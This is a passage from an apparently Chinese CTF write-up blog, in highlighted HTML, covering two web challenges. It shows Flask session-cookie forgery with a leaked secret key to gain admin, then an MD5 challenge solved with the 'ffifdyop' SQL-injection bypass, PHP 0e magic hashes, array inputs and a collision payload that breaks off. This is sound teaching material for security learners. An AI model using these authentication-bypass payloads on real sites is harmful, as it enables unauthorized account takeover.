punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'register'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        user <span class="token operator">=</span> User<span class="token punctuation">(</span>username<span class="token operator">=</span>name<span class="token punctuation">)</span>        user<span class="token punctuation">.</span>set_password<span class="token punctuation">(</span>form<span class="token punctuation">.</span>password<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>add<span class="token punctuation">(</span>user<span class="token punctuation">)</span>        db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>        flash<span class="token punctuation">(</span><span class="token string">'register successful'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'register.html'</span><span class="token punctuation">,</span> title <span class="token operator">=</span> <span class="token string">'register'</span><span class="token punctuation">,</span> form <span class="token operator">=</span> form<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> current_user<span class="token punctuation">.</span>is_authenticated<span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    form <span class="token operator">=</span> LoginForm<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        name <span class="token operator">=</span> strlower<span class="token punctuation">(</span>form<span class="token punctuation">.</span>username<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        session<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token operator">=</span> name        user <span class="token operator">=</span> User<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span>username<span class="token operator">=</span>name<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> user <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">or</span> <span class="token keyword">not</span> user<span class="token punctuation">.</span>check_password<span class="token punctuation">(</span>form<span class="token punctuation">.</span>password<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">'Invalid username or password'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        login_user<span class="token punctuation">(</span>user<span class="token punctuation">,</span> remember<span class="token operator">=</span>form<span class="token punctuation">.</span>remember_me<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'login.html'</span><span class="token punctuation">,</span> title <span class="token operator">=</span> <span class="token string">'login'</span><span class="token punctuation">,</span> form <span class="token operator">=</span> form<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/logout'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    logout_user<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'/index'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/change'</span><span class="token punctuation">,</span> methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">change</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> current_user<span class="token punctuation">.</span>is_authenticated<span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    form <span class="token operator">=</span> NewpasswordForm<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        name <span class="token operator">=</span> strlower<span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        user <span class="token operator">=</span> User<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span>username<span class="token operator">=</span>name<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>        user<span class="token punctuation">.</span>set_password<span class="token punctuation">(</span>form<span class="token punctuation">.</span>newpassword<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>        flash<span class="token punctuation">(</span><span class="token string">'change successful'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'change.html'</span><span class="token punctuation">,</span> title <span class="token operator">=</span> <span class="token string">'change'</span><span class="token punctuation">,</span> form <span class="token operator">=</span> form<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/edit'</span><span class="token punctuation">,</span> methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>                flash<span class="token punctuation">(</span><span class="token string">'post successful'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'edit.html'</span><span class="token punctuation">,</span> title <span class="token operator">=</span> <span class="token string">'edit'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>errorhandler</span><span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">page_not_found</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">:</span>    title <span class="token operator">=</span> <span class="token builtin">unicode</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span>    message <span class="token operator">=</span> error<span class="token punctuation">.</span>description    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'errors.html'</span><span class="token punctuation">,</span> title<span class="token operator">=</span>title<span class="token punctuation">,</span> message<span class="token operator">=</span>message<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">strlower</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">:</span>    username <span class="token operator">=</span> nodeprep<span class="token punctuation">.</span>prepare<span class="token punctuation">(</span>username<span class="token punctuation">)</span>    <span class="token keyword">return</span> username<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h6><ol><li>post</li><li>change</li><li>password</li><li>logout</li></ol><h2 id="解法：session伪造"><a href="#解法：session伪造" class="headerlink" title="解法：session伪造"></a>解法：session伪造</h2><h3 id="解题步骤："><a href="#解题步骤：" class="headerlink" title="解题步骤："></a>解题步骤：</h3><h4 id="1-解密session："><a href="#1-解密session：" class="headerlink" title="1.解密session："></a>1.解密session：</h4><blockquote><blockquote><p> 在index.html中发现：</p></blockquote></blockquote><blockquote><p>只要用户已经认证且session记录的用户名为<code>admin</code>即可</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206261306262.png" alt="image-20220626130638209"></p><blockquote><p>flask的session是存储在客户端cookie中的，而且flask仅仅对数据进行了签名。众所周知的是，签名的作用是防篡改，而无法防止被读取。而flask并没有提供加密操作，所以其session的全部内容都是可以在客户端读取的，这就可能造成一些安全问题。<br> 具体参考大神:<a href="https://links.jianshu.com/go?to=https://www.leavesongs.com/PENETRATION/client-session-security.html">https://www.leavesongs.com/PENETRATION/client-session-security.html</a></p></blockquote><p>我们可以用python脚本把flask的session解密出来，但是如果想要加密伪造生成我们自己的session的话，还需要知道flask用来签名的<code>SECRET_KEY</code>，在github源码里找找，可以在config.py里发现下面代码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">class</span> <span class="token class-name">Config</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    SECRET_KEY <span class="token operator">=</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'SECRET_KEY'</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token string">'ckj123'</span>    SQLALCHEMY_DATABASE_URI <span class="token operator">=</span> <span class="token string">'mysql+pymysql://root:adsl1234@db:3306/test'</span>    SQLALCHEMY_TRACK_MODIFICATIONS <span class="token operator">=</span> <span class="token boolean">True</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>估计<code>ckj123</code>就是<code>SECRET_KEY</code>，所以session伪造这条路可行</p><h5 id="Python解密脚本"><a href="#Python解密脚本" class="headerlink" title="Python解密脚本:"></a>Python解密脚本:</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> zlib<span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64decode<span class="token keyword">from</span> flask<span class="token punctuation">.</span>sessions <span class="token keyword">import</span> session_json_serializer<span class="token keyword">from</span> itsdangerous <span class="token keyword">import</span> base64_decode<span class="token keyword">def</span> <span class="token function">decryption</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload<span class="token punctuation">,</span> sig <span class="token operator">=</span> payload<span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">b'.'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>    payload<span class="token punctuation">,</span> timestamp <span class="token operator">=</span> payload<span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">b'.'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>    decompress <span class="token operator">=</span> <span class="token boolean">False</span>    <span class="token keyword">if</span> payload<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">b'.'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> payload<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>        decompress <span class="token operator">=</span> <span class="token boolean">True</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> base64_decode<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not base64 decode the payload because of '</span>                         <span class="token string">'an exception'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> decompress<span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            payload <span class="token operator">=</span> zlib<span class="token punctuation">.</span>decompress<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not zlib decompress the payload before '</span>                             <span class="token string">'decoding the payload'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> session_json_serializer<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>decryption<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206261231624.png" alt="image-20220626123127551"></p><p>得到解密后的session</p><pre class="line-numbers language-http" data-language="http"><code class="language-http">&#123;'_fresh': True, '_id': b'51930a4e837b744d72c1e52b4265fb8ec1ba1e278cd195a31c9f8b17ceb88e51e11277f017645b2a66c37937915d1966c57884b2b72b2d69fbf37f1d8abdd1f0', 'csrf_token': b'aadc91735aa0529a4ba453b15cacdc8ad2914adc', 'image': b'6Xlz', 'name': 'asdf', 'user_id': '10'&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将name的值改为：admin</p><h4 id="2-session加密："><a href="#2-session加密：" class="headerlink" title="2.session加密："></a>2.session加密：</h4><h5 id="python加密脚本获取："><a href="#python加密脚本获取：" class="headerlink" title="python加密脚本获取："></a>python加密脚本获取：</h5><pre class="line-numbers language-http" data-language="http"><code class="language-http">git clone https://github.com/noraj/flask-session-cookie-manager<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>得到签名后的admin session</p></blockquote><p><img src="C:/Users/13912/AppData/Roaming/Typora/typora-user-images/image-20220626124452116.png" alt="image-20220626124452116"></p><h4 id="3-修改浏览器cookie中的session值："><a href="#3-修改浏览器cookie中的session值：" class="headerlink" title="3.修改浏览器cookie中的session值："></a>3.修改浏览器cookie中的session值：</h4><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206261242698.png" alt="image-20220626124256677"></p><h4 id="4-得到flag："><a href="#4-得到flag：" class="headerlink" title="4.得到flag："></a>4.得到flag：</h4><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206261242661.png" alt="image-20220626124227608"></p><p>然后其实加密的时候 -t参数没必要写这么长，我们可以看到index.html里代码是，只要<code>session[&#39;name&#39;]==admin</code>即可，所以我们可以用</p><pre class="line-numbers language-none"><code class="language-none">python flask_session_cookie_manager3.py encode -s &#39;ckj123&#39; -t &quot;&#123;&#39;name&#39;:&#39;admin&#39;,&#39;user_id&#39;:&#39;10&#39;&#125;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>也能得到flag。</p><h2 id="问题："><a href="#问题：" class="headerlink" title="问题："></a>问题：</h2><p>在给python安装flask时出现了一个问题：</p><pre class="line-numbers language-ini" data-language="ini"><code class="language-ini">pip install flask<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>👲代理就无法</p><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206261334595.png" alt="image-20220626133402546"></p><p>解决方法：</p><p>法一：(找一下代理网址后重新装)</p><pre class="line-numbers language-none"><code class="language-none">pip install flask --proxy&#x3D;&quot;ip:8080&quot; <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>法二：关代理后安装</p><h2 id="法2、3"><a href="#法2、3" class="headerlink" title="法2、3"></a><strong>法2、3</strong></h2><p>法二：Unicode欺骗，经尝试失败了，似乎另一种编码形式的A不能用啦</p><p>法三：条件竞争（太菜啦，先把基础学了，会琢磨的😢）</p><p><a href="(https://www.anquanke.com/post/id/164086#h3-13)">参考一：三种方法</a></p><p><a href="https://www.leavesongs.com/PENETRATION/client-session-security.html">参考二：客户端session问题解释</a></p><hr><h1 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h1><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206261832452.png" alt="image-20220626183214284"></p><h2 id="步骤："><a href="#步骤：" class="headerlink" title="步骤："></a>步骤：</h2><h3 id="抓包，返回hint："><a href="#抓包，返回hint：" class="headerlink" title="抓包，返回hint："></a>抓包，返回hint：</h3><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206261834867.png" alt="image-20220626183443823"></p><p>结合：<img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206261835350.png" alt="image-20220626183536322"></p><h3 id="payload1：ffifdyop绕过"><a href="#payload1：ffifdyop绕过" class="headerlink" title="payload1：ffifdyop绕过"></a>payload1：<code>ffifdyop</code>绕过</h3><h4 id="绕过原理是："><a href="#绕过原理是：" class="headerlink" title="绕过原理是："></a>绕过原理是：</h4><p> <code>ffifdyop</code> 这个字符串被 md5 哈希了之后会变成 <code>276f722736c95d99e921722cf9ed621c</code>，这个字符串前几位刚好是<code>&#39; or &#39;6</code><br> 而 Mysql 刚好又会把 hex 转成 ascii 解释，因此拼接之后的形式是<code>1select * from &#39;admin&#39; where password=&#39;&#39; or &#39;6xxxxx&#39;</code>，等价于 or 一个永真式，因此相当于万能密码</p><p>出现第二个页面：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">!=</span> <span class="token variable">$b</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">// wow, glzjin wants a girl friend.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206261832880.png" alt="image-20220626183242736"></p><h3 id="md5弱比较："><a href="#md5弱比较：" class="headerlink" title="md5弱比较："></a>md5弱比较：</h3><blockquote><blockquote><p>根据代码中的条件，要让a和b值不等但md5值相等。由于这里使用的两个等号，可以借助弱类型来绕过一下。</p></blockquote></blockquote><blockquote><p>PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为<u><em><strong>0</strong></em></u>，所以如果两个不同的密码经过哈希以后，其哈希值都是以”<u><em><strong>0E</strong></em></u>”开头的，那么PHP将会认为他们相同，都是0。</p></blockquote><h3 id="payload2："><a href="#payload2：" class="headerlink" title="payload2："></a>payload2：</h3><p><code>?a=s878926199a&amp;b=s155964671a</code></p><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206261846662.png" alt="image-20220626184636618"></p><p>以0e开头的MD5及原值</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">s878926199a<span class="token number">0e545993274517709034328855841020</span>s155964671a<span class="token number">0e342768416822451524974117254469</span>s214587387a<span class="token number">0e848240448830537924465865611904</span>s214587387a<span class="token number">0e848240448830537924465865611904</span>s878926199a<span class="token number">0e545993274517709034328855841020</span>s1091221200a<span class="token number">0e940624217856561557816327384675</span>s1885207154a<span class="token number">0e509367213418206700842008763514</span>s1502113478a<span class="token number">0e861580163291561247404381396064</span>s1885207154a<span class="token number">0e509367213418206700842008763514</span>s1836677006a<span class="token number">0e481036490867661113260034900752</span>s155964671a<span class="token number">0e342768416822451524974117254469</span>s1184209335a<span class="token number">0e072485820392773389523109082030</span>s1665632922a<span class="token number">0e731198061491163073197128363787</span>s1502113478a<span class="token number">0e861580163291561247404381396064</span>s1836677006a<span class="token number">0e481036490867661113260034900752</span>s1091221200a<span class="token number">0e940624217856561557816327384675</span>s155964671a<span class="token number">0e342768416822451524974117254469</span>s1502113478a<span class="token number">0e861580163291561247404381396064</span>s155964671a<span class="token number">0e342768416822451524974117254469</span>s1665632922a<span class="token number">0e731198061491163073197128363787</span>s155964671a<span class="token number">0e342768416822451524974117254469</span>s1091221200a<span class="token number">0e940624217856561557816327384675</span>s1836677006a<span class="token number">0e481036490867661113260034900752</span>s1885207154a<span class="token number">0e509367213418206700842008763514</span>s532378020a<span class="token number">0e220463095855511507588041205815</span>s878926199a<span class="token number">0e545993274517709034328855841020</span>s1091221200a<span class="token number">0e940624217856561557816327384675</span>s214587387a<span class="token number">0e848240448830537924465865611904</span>s1502113478a<span class="token number">0e861580163291561247404381396064</span>s1091221200a<span class="token number">0e940624217856561557816327384675</span>s1665632922a<span class="token number">0e731198061491163073197128363787</span>s1885207154a<span class="token number">0e509367213418206700842008763514</span>s1836677006a<span class="token number">0e481036490867661113260034900752</span>s1665632922a<span class="token number">0e731198061491163073197128363787</span>s878926199a<span class="token number">0e545993274517709034328855841020</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'param1'</span><span class="token punctuation">]</span><span class="token operator">!==</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'param2'</span><span class="token punctuation">]</span><span class="token operator">&amp;&amp;</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'param1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'param2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>md5强比较，此时如果传入的两个参数不是字符串，而是数组，md5()函数无法解出其数值，而且不会报错，就会得到===强比较的值相等</p><h3 id="payload3"><a href="#payload3" class="headerlink" title="payload3:"></a>payload3:</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">param1<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>param2<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206261851522.png" alt="image-20220626185144460"></p><p>其实不止传数组一种解法，还可以构造相同md5值的两条数据。md5值相同的字符串目前为没有找到，但二进制数据是有的，在传递时注意url编码即可。这里给出另一个解：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">param1<span class="token operator">=</span><span class="token operator">%</span><span class="token number">4</span>d<span class="token operator">%</span>c9<span class="token operator">%</span><span class="token number">68</span><span class="token operator">%</span>ff<span class="token operator">%</span><span class="token number">0</span>e<span class="token operator">%</span>e3<span class="token operator">%</span><span class="token number">5</span>c<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">95</span><span class="token operator">%</span><span class="token number">72</span><span class="token operator">%</span>d4<span class="token operator">%</span><span class="token number">77</span><span class="token operator">%</span><span class="token number">7</span>b<span class="token operator">%</span><span class="token number">72</span><span class="token operator">%</span><span class="token number">15</span><span class="token operator">%</span><span class="token number">87</span><span class="token operator">%</span>d3<span class="token operator">%</span><span class="token number">6</span>f<span class="token operator">%</span>a7<span class="token operator">%</span>b2<span class="token operator">%</span><span class="token number">1</span>b<span class="token operator">%</span>dc<span class="token operator">%</span><span class="token number">56</span><span class="token operator">%</span>b7<span class="token operator">%</span><span class="token number">4</span>a<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span>c0<span class="token operator">%</span><span class="token number">78</span><span class="token operator">%</span><span class="token number">3</span>e<span class="token operator">%</span><span class="token number">7</span>b<span class="token operator">%</span><span class="token number">95</span><span class="token operator">%</span><span class="token number">18</span><span class="token operator">%</span>af<span class="token operator">%</span>bf<span class="token operator">%</span>a2<span class="token operator">%</span><span class="token number">02</span><span class="token operator">%</span>a8<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">4</span>b<span class="token operator">%</span>f3<span class="token operator">%</span><span class="token number">6</span>e<span class="token operator">%</span><span class="token number">8</span>e<span class="token operator">%</span><span class="token number">4</span>b<span class="token operator">%</span><span class="token number">55</span><span class="token operator">%</span>b3<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">42</span><span class="token operator">%</span><span class="token number">75</span><span class="token operator">%</span><span class="token number">93</span><span class="token operator">%</span>d8<span class="token operator">%</span><span class="token number">49</span><span class="token operator">%</span><span class="token number">67</span><span class="token operator">%</span><span class="token number">6</span>d<span class="token operator">%</span>a0<span class="token operator">%</span>d1<span class="token operator">%</span>d5<span class="token operator">%</span><span class="token number">5</span>d<span class="token operator">%</span><span class="token number">83</span><span class="token operator">%</span><span class="token number">60</span><span class="token operator">%</span>fb<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">07</span><span class="token operator">%</span>fe<span class="token operator">%</span>a2<span class="token operator">&amp;</span>param2<span class="token operator">=</span><span class="token operator">%</span><span class="token number">4</span>d<span class="token operator">%</span>c9<span class="token operator">%</span><span class="token number">68</span><span class="token operator">%</span>ff<span class="token operator">%</span><span class="token number">0</span>e<span class="token operator">%</span>e3<span class="token operator">%</span><span class="token number">5</span>c<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span 